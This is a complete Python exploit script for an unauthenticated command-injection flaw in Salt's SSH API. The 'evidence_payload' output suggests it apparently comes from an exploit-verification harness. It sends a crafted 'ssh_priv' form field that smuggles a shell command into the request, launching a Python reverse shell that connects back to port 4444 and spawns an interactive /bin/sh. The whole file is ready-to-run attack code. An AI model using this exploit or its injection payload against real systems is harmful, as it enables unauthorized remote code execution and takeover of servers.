#!/usr/bin/env python3
"""Reach a shell through Salt's unauthenticated SSH API request."""

import json
import os
import urllib.parse
import urllib.request


def build_shell_payload() -> str:
    shell_code = (
        'import os,socket;'
        's=socket.create_connection(("127.0.0.1",4444));'
        '[os.dup2(s.fileno(),fd) for fd in (0,1,2)];'
        'os.execl("/bin/sh","sh","-i")'
    )
    return "aaa|python3 -c '" + shell_code + "';"


def main() -> None:
    base_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    fields = {
        "token": "12312",
        "client": "ssh",
        "tgt": "*",
        "fun": "a",
        "roster": "whip1ash",
        "ssh_priv": build_shell_payload(),
    }
    request = urllib.request.Request(
        base_url + "/run",
        data=urllib.parse.urlencode(fields).encode(),
        headers={
            "Accept": "application/x-yaml",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    with urllib.request.urlopen(request, timeout=90) as response:
        body = response.read().decode(errors="replace")
        print(json.dumps({"evidence_payload": {
            "api_status": response.status,
            "api_response": body[:200],
        }}))


if __name__ == "__main__":
    main()
